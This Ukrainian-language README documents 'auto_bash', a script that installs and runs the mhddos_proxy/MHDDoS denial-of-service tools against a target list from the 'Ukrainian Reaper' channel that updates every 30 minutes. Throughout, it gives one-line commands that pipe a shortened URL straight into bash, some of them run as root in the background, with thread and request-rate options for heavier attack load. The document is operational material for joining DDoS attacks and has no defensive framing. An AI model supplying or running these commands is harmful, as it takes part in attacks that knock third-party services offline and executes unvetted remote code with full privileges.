## 🪖 Bash скрипт (Windows, Linux, WSL2, Віртуальна машина)  

## ❕Опис

### auto_bash - скрипт на bash, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)

* Запускається однією командою в Linux і WSL2 (Windows Subsystem for Linux). Подальше втручання від користувача не обов'язкове. 
 
```
curl -L tiny.one/autobash | bash
```
* Автоматично встановлює git, python3, pip, mhddos_proxy, MHDDoS, розширений список proxy і всі залежності.

* Праюцює із базою сайтів [Українського женця](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).

* База цілей оновлюється кожні 30 хвилин.

* Під час запуску завжди перевіряє і завантажує оновлення mhddos_proxy і MHDDoS.

Рекомендовано використовувати на Ubuntu 20.04+ або Debian 11+. Але повинно працювати на всіх Debian похідних, наприклад Kali, а також у WSL2.

Для зупинки скрипта закрийте вікно з терміналом.

## ❕Запуск у фоні
Виконувати як root. Інакше скрипт спитає пароль у фоні і ви не зможете його ввести.

```
curl -L tiny.one/autobash | nohup bash
```
Після цього термінал можна зачиняти і скрипт продовжить працювати в фоні.

## ❕Зміна інтенсивності

Якщо скрипт дуже уповільнює ПК, або навпаки ви маєте невикористані ресурси, можна понизити, або навпаки підвищіти інтенсивність роботи скрипта. Для цього треба керувати параметром `threads`. По замовчуванню `threads = 1000`. Значення потрібно підбирати індивідуально, цифри нижче лише для прикладу. В більшості випадків рекомендується не змінювати значення параметру і використовувати команду по замовчуванню.

Щоб знизити навантаження на систему, спробуйте використати `threads = 500`

```
curl -L tiny.one/autobash | bash -s -- 500
```

Щоб навантажити систему більше, спробуйте використати `threads = 2000`

```
curl -L tiny.one/autobash | bash -s -- 4000
```


## ❕ Передача параметрів (бета версія)
```
curl -L tiny.one/autobash-test | bash -s -- -t 1000 -r 2000 -k 1 --table
```

`-t 1000` - 1000 тредів

`-r 2000` - 2000 rpc

`-k 1` - kill 1 hour. Завершити скрипт через 1 годину роботи

`--table` - увімкнути режим відображення данних в таблиці


## Зупинка скрипту

1. Або просто зачинити термінал (якщо не використовується nohup).

2. Або в іншому терміналі виконати `pkill -f start.py; pkill -f runner.py` а потім натиснути CTRL+C у терміналі з скриптом.

## Запуск на Windows у powershell.

Потрібна лише Windows 7 або вище. Усе інше скрипт зробить самостійно.

https://github.com/mErlin-sp/mhddos_powershell

## Встановлення на Windows.

[Инструкція по встановленнию Python3 і Git на Windows](https://telegra.ph/Vstanovlennya-mhddos-proxy-napryamu-na-vash-komp-03-27). Не тестувалось на сумісність з auto_bash. Дозволяє як мінімум запускати mhddos_proxy командами які надаються в каналі [українського женця](https://t.me/ukrainian_reaper_ddos). У випадку помилок можна написати по координатах, залишених в кінці інструкції.
